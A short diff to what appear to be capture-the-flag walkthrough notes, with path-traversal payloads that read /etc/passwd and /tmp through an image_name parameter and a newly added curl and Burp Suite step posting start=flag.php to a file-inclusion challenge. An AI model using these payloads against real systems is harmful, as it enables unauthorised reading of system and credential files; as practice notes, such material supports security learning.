@@ -63,3 +63,8 @@ File-Crawler
 2. Try a simple payload: example.com/local?image_name=../../../etc/passwd
 3. example.com/local?image_name=..//..//..//etc//passwd
 4. look for /tmp folder, local?image_name=..//tmp
+
+Alien-inclusion
+
+1. use the command curl 'link' --data 'start=flag.php'
+2. (optional) can do the same thing using burp suite and entering start=flag.php at the end as a parameter when sending a request.
